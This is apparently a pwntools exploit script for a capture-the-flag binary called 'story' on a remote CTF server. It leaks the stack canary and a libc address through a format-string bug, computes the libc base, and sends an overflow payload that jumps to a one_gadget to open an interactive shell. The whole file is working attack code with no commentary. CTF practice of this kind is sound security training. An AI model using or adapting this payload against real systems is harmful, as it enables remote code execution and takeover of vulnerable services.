from pwn import *
#p= process('story')
p=remote('ctf2.linkedbyx.com',10895)
libc = ELF('./libc-2.23.so')
raw_input()
p.sendline("%15$p%25$p")
p.recvuntil("0x")

canary = int(p.recvuntil("0x")[:-2],16)
info("canary:0x%x",canary)
addr = int(p.recvuntil('\n')[:-1],16)
libc_base = addr - libc.symbols['__libc_start_main']-0xf0
info("libc:0x%x",libc_base)
one = libc_base+0xf1147
pay = (0x808-0x780)*'\x00'+p64(canary)+p64(0)+p64(one)+'\x00'*400
p.recvuntil('story')
p.sendline('200')
p.recvuntil('story')
p.sendline(pay)
p.interactive()
